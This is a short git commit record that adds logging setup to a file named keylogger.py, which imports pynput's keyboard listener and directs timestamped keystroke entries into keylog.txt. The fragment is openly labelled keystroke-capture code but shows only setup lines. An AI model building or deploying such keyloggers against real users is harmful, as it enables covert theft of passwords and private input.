194bce8d6827f81cdd9a5e7f73c92693a1f7eaeb
Rahul Singh <rahul@Rahuls-MacBook-Air.local>
2024-02-05 17:51:20 +0000

    Add basic log configuration

--- keylogger.py
+++ keylogger.py
@@ -1,3 +1,8 @@
 # Import necessary modules
 from pynput.keyboard import Key, Listener  # Import Key and Listener from pynput.keyboard
 import logging  # Import the logging module
+
+# Configure logging settings
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+# Set up logging to a file named "keylog.txt", capturing messages of DEBUG level and higher,
+# with a specific format including timestamp and log message.
